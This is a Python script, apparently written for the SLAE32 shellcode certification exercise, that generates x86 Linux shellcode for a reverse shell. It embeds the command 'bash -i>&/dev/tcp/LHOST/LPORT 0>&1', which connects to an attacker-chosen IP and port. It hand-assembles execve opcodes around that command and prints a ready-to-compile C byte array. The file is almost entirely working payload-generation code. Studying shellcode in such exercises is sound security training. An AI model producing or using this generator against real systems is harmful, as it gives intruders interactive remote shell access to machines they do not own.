#!/usr/bin/python3

'''
	Jean-Pierre LESUEUR
	@DarkCoderSc

	jplesueur@phrozen.io
	https://www.phrozen.io

	***
	SLAE32 Certification Exercise NÂ°2
 	(Pentester Academy).
 	https://www.pentesteracademy.com
	***

	Description:

 	Generate a TCP Reverse Shell with desired IP Address and TCP Port number.
'''

import socket
import sys
import struct
from textwrap import wrap

def fail(message):
    print("[\033[31mKO\033[39m] " + message)

def success(message):
    print("[\033[32mOK\033[39m] " + message)
	
try:
	if len(sys.argv) != 3:
		print("Usage: ./gen_revshell.py <LHOST> <LPORT>")

		raise
	else:
		LHOST = sys.argv[1]
		try:			
			socket.inet_aton(LHOST)
		except:
			fail("Invalid IP address (ex:127.0.0.1)")
			raise

		try:
			LPORT = int(sys.argv[2])

			if (LPORT > 65535) or (LPORT < 0):
				raise
		except:
			fail("Invalid port number (0..65535)")
			raise
except:
	sys.exit()			

revstr = "/*/bash -i>&/dev/tcp/{}/{} 0>&1"

payload = ""

payload += "\\x31\\xc0"                 # xor eax, eax
payload += "\\x50"                      # push eax
payload += "\\x68\\x62\\x61\\x73\\x68"  # push   0x68736162
payload += "\\x68\\x69\\x6e\\x2f\\x2f"  # push   0x2f2f6e69
payload += "\\x68\\x2f\\x2f\\x2f\\x62"  # push   0x622f2f2f
payload += "\\x89\\xe3"                 # mov    ebx,esp
payload += "\\x66\\xb8\\x2d\\x63"       # mov    ax,0x632d
payload += "\\x50"                      # push   eax
payload += "\\x31\\xc0"                 # xor    eax,eax
payload += "\\x89\\xe2"                 # mov    edx,esp
payload += "\\x50"                      # push   eax
#########################################

'''
	Align command following chosen options
'''
LHOST = struct.unpack("!I", socket.inet_aton(LHOST))[0]

revstr = revstr.format(LHOST, LPORT)

pad = 4 - (len(revstr) % 4)

if (pad < 4):
	revstr = ("/"*pad) + revstr

'''
	Write our reverse shell command (Aligned)
'''

for i in reversed(range(0, len(revstr), 4)):
	opcode = "\\x68"
	for n in range(4):
		opcode += "\\x" + revstr[i:(i+4)][n:(n+1)].encode('ascii').hex()
		

	payload += opcode

#########################################
payload += "\\x89\\xe6"                 # mov    esi,esp
payload += "\\x50"                      # push   eax
payload += "\\x56"                      # push   esi
payload += "\\x52"                      # push   edx
payload += "\\x53"                      # push   ebx
payload += "\\x89\\xe1"                 # mov    ecx,esp
payload += "\\x50"                      # push   eax
payload += "\\x89\\xe2"                 # mov    edx,esp
payload += "\\xb0\\x0b"                 # mov    al,0xb
payload += "\\xcd\\x80"                 # int    0x80

size = int(len(payload) / 4)
success("Shellcode successfully generated size={} Bytes.".format(size))

final_payload = "// Shellcode size = {}\n".format(size)
final_payload += "unsigned char code[] = \\\n"

for l in wrap(payload, 64):
	final_payload += "\t\"{}\"\n".format(l)

final_payload = final_payload[:-1] + ";"

print(final_payload)
